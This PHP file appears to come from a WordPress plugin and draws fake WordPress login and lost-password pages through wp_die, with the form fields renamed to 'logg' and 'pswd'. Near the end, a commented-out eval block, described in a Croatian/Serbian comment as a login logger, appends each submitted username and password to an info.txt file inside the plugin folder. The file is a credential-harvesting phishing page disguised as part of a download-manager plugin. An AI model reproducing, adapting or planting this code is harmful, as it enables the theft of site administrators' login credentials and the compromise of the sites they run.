<?php

$siteurl = get_site_url();

if ( isset($_GET['action']) && $_GET['action'] === 'lostpassword' ) {

/* LOST PASSWORD PAGE */

wp_die(
'<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]-->
<head></head>
<body class="login login-action-lostpassword wp-core-ui  locale-en-us">
	<div id="login">
	<h1><a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1">Powered by WordPress</a></h1>
	<p class="message">Please enter your username or email address. You will receive a link to create a new password via email.</p>

	<form name="lostpasswordform" id="lostpasswordform" action="'.$siteurl.'/wp-admin/?action=lostpassword" method="post" _lpchecked="1">
	<p>
		<label for="user_login">Username or Email Address<br>
		<input type="text" name="user_login" id="user_login" class="input" value="" size="20" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"></label>
	</p>
		<input type="hidden" name="redirect_to" value="">
	<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Get New Password"></p>
	</form>

	<p id="nav">
		<a href="'.$siteurl.'/wp-admin/">Log in</a>
	</p>
	<p id="backtoblog"><a href="'.$siteurl.'/">← Back to Download manager plugin</a></p>
	</div>
	<div class="clear"></div>	
</body></html>

<style type="text/css">
	.login #login_error, .login .message {
	    border-left: 4px solid #00a0d2;
	    padding: 12px;
	    margin-left: 0;
	    margin-bottom: 20px;
	    background-color: #fff;
	    box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);
    	font-size: 13px!important;
	}
	html {
		background: #f1f1f1;
	}
	body {
		color: #444;
		background: transparent;
		font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
		margin: 0;
		padding: 0;
		max-width: 100%;
		box-shadow: none;
	}
	#error-page {
		margin-top: 0;
	}
	#error-page p {
		margin: 0;
	}
	.login * {
	    margin: 0;
	    padding: 0;
	}
	#login {
	    width: 320px;
	    padding: 8% 0 0;
	    margin: auto;
	}
	.login h1 {
		border-bottom: none;
	}
	.login h1 a {
	    background-image: url(images/w-logo-blue.png?ver=20131202);
	    background-image: none,url(images/wordpress-logo.svg?ver=20131107);
	    background-size: 84px;
	    background-position: center top;
	    background-repeat: no-repeat;
	    color: #444;
	    height: 84px;
	    font-size: 20px;
	    line-height: 1.3em;
	    margin: 0 auto 25px;
	    padding: 0;
	    width: 84px;
	    text-indent: -9999px;
	    outline: 0;
	    display: block;
	}
	.login form {
	    margin-top: 20px;
	    margin-left: 0;
	    padding: 26px 24px 46px;
	    background: #fff;
	    box-shadow: 0 1px 3px rgba(0,0,0,.13);
	    height: 108px;
	}
	.login form .input, .login input[type=text] {
	    font-size: 24px;
	    width: 264px;
	    padding: 3px;
	    margin: 2px 6px 16px 0;
	}
	input[type=text], input[type=password] {
		border: 1px solid #ddd;
	    box-shadow: inset 0 1px 2px rgba(0,0,0,.07);
	    background-color: #fff;
	    color: #32373c;
	    outline: 0;
	    transition: 50ms border-color ease-in-out;	
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;	
	}
	.login label {
	    color: #72777c;
	    cursor: pointer;
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
	}
	.login form .forgetmenot label {
	    font-size: 12px;
	    line-height: 19px;
	}
	input[type=checkbox] {
	    border: 1px solid #b4b9be;
	    background: #fbfbfb;
	    color: #555;
	    clear: none;
	    cursor: pointer;
	    display: inline-block;
	    line-height: 0;
	    height: 16px;
	    margin: -4px 4px 0 0;
	    outline: 0;
	    padding: 0!important;
	    text-align: center;
	    vertical-align: middle;
	    width: 16px;
	    min-width: 16px;
	    -webkit-appearance: none;
	    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
	    transition: .05s border-color ease-in-out;
	}
	input[type=checkbox]:checked:before {
	    content: "\f147";
	    margin: -3px 0 0 -4px;
	    color: #1e8cbe;
	}	
	input[type=radio]:checked:before, input[type=checkbox]:checked:before {
	    float: left;
	    display: inline-block;
	    vertical-align: middle;
	    width: 16px;
	    font: 400 21px/1 dashicons;
	    speak: none;
	    -webkit-font-smoothing: antialiased;
	    -moz-osx-font-smoothing: grayscale;
	}	
	.forgetmenot {
		margin-top: -2px!important;
	}
	#loginform p.submit {
		margin: -20px 0 30px;
	}
	.login .button-primary {
	    float: right;
	    background: #0085ba;
	    border-color: #0073aa #006799 #006799;
	    box-shadow: 0 1px 0 #006799;
	    color: #fff;
	    text-decoration: none;
	    text-shadow: 0 -1px 1px #006799, 1px 0 1px #006799, 0 1px 1px #006799, -1px 0 1px #006799;
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
	}
	.login #nav {
	    margin: 24px 0 0;
	}
	.login #backtoblog, .login #nav {
	    font-size: 13px;
	    padding: 0 24px;
	}	
	.login #backtoblog a, .login #nav a {
	    text-decoration: none;
	    color: #555d66;
	}
	#backtoblog {
	    margin: 16px 0!important;
	}
</style>

</body></html>', 
'Log In ‹ Download manager plugin — WordPress' 
);

} else { /* WP-ADMIN PAGE */

wp_die(
'<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><head></head><body>
<div class="login-box login">
	<div id="login">
	<h1>
		<a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1">Powered by WordPress</a>
	</h1>
		
	<form name="loginform" id="loginform" action="'.$siteurl.'/wp-admin/" method="post" _lpchecked="1">
		<p>
			<label for="user_login">Username or Email Address<br>
			<input type="text" name="logg" id="user_login" class="input" value="" size="20" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;); cursor: auto;"></label>
		</p>
		<p>
			<label for="user_pass">Password<br>
			<input type="password" name="pswd" id="user_pass" class="input" value="" size="20" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;); cursor: auto;"></label>
		</p>
			<div class="forgetmenot">
				<label for="rememberme">
					<input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me
				</label>
			</div>
		<p class="submit">
			<input type="submit" name="wpp-submit" id="wpp-submit" class="button button-primary button-large" value="Log In">
			<input type="hidden" name="redirect_to" value="'.$siteurl.'/wp-admin/">
			<input type="hidden" name="testcookie" value="1">
		</p>
	</form>

	<p id="nav">
		<a href="'.$siteurl.'/wp-admin/?action=lostpassword">Lost your password?</a>
	</p>
	<p id="backtoblog"><a href="'.$siteurl.'/">← Back to Download manager plugin</a></p>
	</div>
</div>

<style type="text/css">
	html {
		background: #f1f1f1;
	}
	body {
		color: #444;
		background: transparent;
		font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
		margin: 0;
		padding: 0;
		max-width: 100%;
		box-shadow: none;
	}
	#error-page {
		margin-top: 0;
	}
	#error-page p {
		margin: 0;
	}
	.login * {
	    margin: 0;
	    padding: 0;
	}
	#login {
	    width: 320px;
	    padding: 8% 0 0;
	    margin: auto;
	}
	.login h1 {
		border-bottom: none;
	}
	.login h1 a {
	    background-image: url(images/w-logo-blue.png?ver=20131202);
	    background-image: none,url(images/wordpress-logo.svg?ver=20131107);
	    background-size: 84px;
	    background-position: center top;
	    background-repeat: no-repeat;
	    color: #444;
	    height: 84px;
	    font-size: 20px;
	    line-height: 1.3em;
	    margin: 0 auto 25px;
	    padding: 0;
	    width: 84px;
	    text-indent: -9999px;
	    outline: 0;
	    display: block;
	}
	.login form {
	    margin-top: 20px;
	    margin-left: 0;
	    padding: 26px 24px 46px;
	    background: #fff;
	    box-shadow: 0 1px 3px rgba(0,0,0,.13);
	}
	.login form .input, .login input[type=text] {
	    font-size: 24px;
	    width: 264px;
	    padding: 3px;
	    margin: 2px 6px 16px 0;
	}
	input[type=text], input[type=password] {
		border: 1px solid #ddd;
	    box-shadow: inset 0 1px 2px rgba(0,0,0,.07);
	    background-color: #fff;
	    color: #32373c;
	    outline: 0;
	    transition: 50ms border-color ease-in-out;	
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;	
	}
	.login label {
	    color: #72777c;
	    cursor: pointer;
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
	}
	.login form .forgetmenot label {
	    font-size: 12px;
	    line-height: 19px;
	}
	input[type=checkbox] {
	    border: 1px solid #b4b9be;
	    background: #fbfbfb;
	    color: #555;
	    clear: none;
	    cursor: pointer;
	    display: inline-block;
	    line-height: 0;
	    height: 16px;
	    margin: -4px 4px 0 0;
	    outline: 0;
	    padding: 0!important;
	    text-align: center;
	    vertical-align: middle;
	    width: 16px;
	    min-width: 16px;
	    /*-webkit-appearance: none;*/
	    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
	    transition: .05s border-color ease-in-out;
	}
	input[type=checkbox]:checked:before {
	    content: "\f147";
	    margin: -3px 0 0 -4px;
	    color: #1e8cbe;
	}	
	input[type=radio]:checked:before, input[type=checkbox]:checked:before {
	    float: left;
	    /*display: inline-block;*/
	    display: none;
	    vertical-align: middle;
	    width: 16px;
		font: 400 21px/1 dashicons!important;
	    speak: none;
	    -webkit-font-smoothing: antialiased;
	    -moz-osx-font-smoothing: grayscale;
	}
	.forgetmenot {
		margin-top: -2px!important;
	}
	#loginform p.submit {
		margin: -20px 0 30px;
	}
	.login .button-primary {
	    float: right;
	    background: #0085ba;
	    border-color: #0073aa #006799 #006799;
	    box-shadow: 0 1px 0 #006799;
	    color: #fff;
	    text-decoration: none;
	    text-shadow: 0 -1px 1px #006799, 1px 0 1px #006799, 0 1px 1px #006799, -1px 0 1px #006799;
	    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
	}
	.login #nav {
	    margin: 24px 0 0;
	}
	.login #backtoblog, .login #nav {
	    font-size: 13px;
	    padding: 0 24px;
	}	
	.login #backtoblog a, .login #nav a {
	    text-decoration: none;
	    color: #555d66;
	}
	#backtoblog {
	    margin: 16px 0!important;
	}
</style>

</body></html>' /*. 

eval( /* LOG sistem; Upisivanje login podataka u info.txt datoteku */ /*
'if( isset($_POST["wpp-submit"]) ){
	$myfile = fopen( plugin_dir_path( __FILE__ ) . "info.txt", "a" ) or die("");
	$txt = date("Y-m-d H:i:s") . "  /  " . $_POST["logg"] . " - " . $_POST["pswd"] . " - " . $siteurl;
	fwrite($myfile, $txt . "\n");
	fclose($myfile);
	echo "<meta http-equiv=' . "'refresh'" . 'content=' . "'0'" . '>";
}')*/, 

'Log In ‹ Download manager plugin — WordPress' 
);

}



?>

<script>



</script>